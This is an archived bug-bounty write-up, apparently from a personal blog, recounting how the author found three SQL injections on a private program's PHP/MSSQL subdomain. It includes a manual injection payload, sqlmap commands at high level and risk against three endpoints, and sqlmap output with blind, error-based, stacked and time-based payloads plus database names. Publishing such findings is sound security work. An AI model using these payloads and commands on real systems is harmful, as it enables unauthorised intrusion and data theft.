---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-23_how-i-got-3-sql-injection-in-just-10-minutes.md
original_filename: 2021-10-23_how-i-got-3-sql-injection-in-just-10-minutes.md
title: How i Got 3 SQL injection in just 10 minutes.
category: documents
detected_topics:
- sqli
- command-injection
tags:
- imported
- documents
- sqli
- command-injection
language: en
raw_sha256: 0b7d086bddea3e98221057b9ba121e807849aff36b5972ee0de8f6e3090db475
text_sha256: a2926897e9e8c008bfb573403554acc08def1c561c390f3d66b9d414cddd4173
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# How i Got 3 SQL injection in just 10 minutes.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-23_how-i-got-3-sql-injection-in-just-10-minutes.md
- Source Type: markdown
- Detected Topics: sqli, command-injection
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `0b7d086bddea3e98221057b9ba121e807849aff36b5972ee0de8f6e3090db475`
- Text SHA256: `a2926897e9e8c008bfb573403554acc08def1c561c390f3d66b9d414cddd4173`


## Content

---
title: "How i Got 3 SQL injection in just 10 minutes."
page_title: "How i Got 3 SQL injection in just 10 minutes | XDev05"
url: "https://xdev05.github.io/How-i-Got-3-SQLI-in-just-10-minutes/"
final_url: "https://xdev05.github.io/How-i-Got-3-SQLI-in-just-10-minutes/"
authors: ["Ahmed Fatouh (@XDev05)"]
bugs: ["SQL injection"]
publication_date: "2021-10-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3223
---

October 23, 2021  5 min to read

# How i Got 3 SQL injection in just 10 minutes

How i Got 3 SQL injection in just 10 minutes

![Featured image](https://1.bp.blogspot.com/-kffR9cHu9Mg/WETBF5pCNdI/AAAAAAAAAfI/4Pm_Dc0rdbkn3YHbNrM0MAMTKheTJmokgCEw/s1600/sqlinjection2.png)

> **Hello friends, in this writeup i will tell you how i found a 3 easy sqli in a priv program, let’s say the program domain is`example.com`.**

> **after enumerating the subdomains i’ve found a delicious one which have a login page and this subdoamin working with PHP 7 and windows server, let’s take a look.**

![](https://i.ibb.co/zHGTj6Z/1.png)

  * **you can know what is the technology which the website use by wappalyzer**.

> **as we know this website using`PHP` so let’s inject a single qute in a username field.**

> **it’s sqlmap time, i see this is basic error based sqli so let’s try with`sqlmap`.**

> **Put a`'` in any field of the login page and intercept the request with burpsuite, and save the request in a file like this.**

> **i did it manualy with this payload`admin'SELECT+1,@@VERSION,3--` and its gave me the version but i want to play with sqlmap.** ![](https://i.ibb.co/34dv4nC/3.png)

> **`sqlmap -r req.txt --batch --dbms=mssql --level 5 --risk 3 --dbs`**

![](https://i.ibb.co/rZQZ2NN/4.png) ![](https://i.ibb.co/q52Pwjd/5.png)

  * **nice!, we got first sql injection, lets dig more.**

> **when doing some recon i’ve found another endpoint called`getimage.php`, you can find it with `ffuf,dirbuster,dirb`. and in this endpoint their is a Parameter called `id` and this paramtere injectable!.**

> **browse the`getimage` endpoint and send the request to repeater, and use `Param Miner` extension.**

![](https://i.ibb.co/vvCyDzW/6.png)

![](https://i.ibb.co/12wJ8g8/7.png)

![](https://i.ibb.co/XsmKm8R/8.png)

> **okay now we have`id` parameter, let’s use sqlmap on this paramter.**

> **`sqlmap -u https://sub.ex.net/getimage.php\?id\=1 --batch --dbms=mssql --level 5 --risk 3 --dbs`**

![](https://i.ibb.co/17S1Wgk/9.png)

![](https://i.ibb.co/3TH0tx1/10.png)

  * **nice!, we got the seconed one.**

> **cool, as the seconed step, i do the same thing and i’ve found andother endpoint called`downloads.php` and this endpoint has a parameter called `dir`.**

![](https://i.ibb.co/rZ19Y0b/12.png)

![](https://i.ibb.co/vktshRV/11.png)

> **`sqlmap -u https://sub.ex.net/downloads.php\?dir\=a --batch --dbms=mssql --level 5 --risk 3 --dbs`**
  
  
  Parameter: dir (GET)
  Type: boolean-based blind
  Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  Payload: id=1 AND 3913=(SELECT (CASE WHEN (3913=3913) THEN 3913 ELSE (SELECT 1391 UNION SELECT 8467) END))-- bPfy
  
  Type: error-based
  Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
  Payload: id=1 AND 7962 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7962=7962) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)))
  
  Type: stacked queries
  Title: Microsoft SQL Server/Sybase stacked queries (comment)
  Payload: id=1;WAITFOR DELAY '0:0:5'--
  
  Type: time-based blind
  Title: Microsoft SQL Server/Sybase time-based blind (IF)
  Payload: id=1 WAITFOR DELAY '0:0:5'
  ---
  [15:49:30] [INFO] testing Microsoft SQL Server
  [15:49:30] [INFO] confirming Microsoft SQL Server
  [15:49:30] [INFO] the back-end DBMS is Microsoft SQL Server
  web server operating system: Windows 2016 or 2019 or 10
  web application technology: PHP 7.4.14, Microsoft IIS 10.0
  back-end DBMS: Microsoft SQL Server 2019
  [15:49:30] [INFO] fetching database names
  [15:49:30] [INFO] resumed: 'DBAUtils'
  [15:49:30] [INFO] resumed: 'master'
  [15:49:30] [INFO] resumed: 'model'
  [15:49:30] [INFO] resumed: 'msdb'
  [15:49:30] [INFO] resumed: 'xxxxx'
  [15:49:30] [INFO] resumed: 'tempdb'
  available databases [6]:
  [*] DBAUtils
  [*] master
  [*] model
  [*] msdb
  [*] xxxxx
  [*] tempdb
  
  

  * **nice!, we got the third one.**

  * **Thanks for reading.**

  * **cheers!.**
